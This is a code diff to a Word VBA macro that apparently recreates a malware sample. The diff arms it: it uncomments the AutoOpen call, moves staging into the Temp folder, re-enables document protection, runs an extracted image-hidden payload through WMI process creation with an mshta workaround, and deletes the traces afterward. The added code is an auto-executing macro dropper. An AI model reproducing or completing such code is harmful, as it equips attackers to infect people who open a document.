@@ -8,8 +8,7 @@ End Sub
 ' The malware payload was originally located in Document_Open(),
 ' which is why we are preserving it
 Sub AutoOpen()
-    ' TODO: Remove to activate
-    'Call Document_Open
+    Call Document_Open
 End Sub
 
 Sub Document_Open()
@@ -43,22 +42,18 @@ Sub Document_Open()
         DocName = Left(DocName, InStr(DocName, ".") - 1)
     End If
 
-    ' DEBUG: Don't pollute Temp
-    TempPath = ActiveDocument.Path & "\" & DocName
-    ' TempPath = Environ("Temp") & "\" & DocName
+    TempPath = Environ("Temp") & "\" & DocName
 
     ' This line is smoke and mirrors
     CreatedExeFilePath = Environ("Temp") & "\" & ExeFileName
 
     ActiveDocument.SaveAs TempPath, wdFormatHTML, , , , , True
 
-    ' DEBUG: Don't protect document
-    'Call Show
+    Call Show
 
     TempPath = TempPath & "_files"
     CreatedImageFilePath = TempPath & "\" & imageFileName
-    ' DEBUG: uses Environ("Temp") instead of TempPath on below line.
-    CreatedImageBMPFilePath = TempPath & "\" & Left(imageFileName, InStrRev(imageFileName, ".")) & Ext1
+    CreatedImageBMPFilePath = Environ("Temp") & "\" & Left(imageFileName, InStrRev(imageFileName, ".")) & Ext1
     ' Extract the malicious  payload from the png host
     ' This is not an in-built function. The function itself was obtained from malware dumps online
     ' But it doesn't seem to work. I am looking into the conversion mechanism to see what could be
@@ -66,12 +61,16 @@ Sub Document_Open()
     Call WIA_ConvertImage(CreatedImageFilePath, CreatedImageBMPFilePath)
 
     Set objWMIService = GetObject(Calc)
-    ' FIXME: The payload extraction doesn't work so this relies on a static payload file for now.
     ' FIXME: For some reason, Value & " " & CreatedImageBMPFilePath doesn't work, the string concatenation fails
     ' when concatenating Value & " " & TempPath ... and simply results in Value being the output.
-    objWMIService.Create "mshta" & " " & TempPath & "\" & "index.zip"
-    'Kill TempPath & "\*.*"
-    'RmDir TempPath
+    objWMIService.Create Value & " " & CreatedImageBMPFilePath
+
+    ' As a workaround for demonstration purposes the following can be used,
+    ' Placing the HTA payload in a separate file and providing its path here
+    ' objWMIService.Create "mshta" & " " & Environ(Temp) & "\" & "index.zip"
+
+    Kill TempPath & "\*.*"
+    RmDir TempPath
 
 Error_Handler:
     Exit Sub
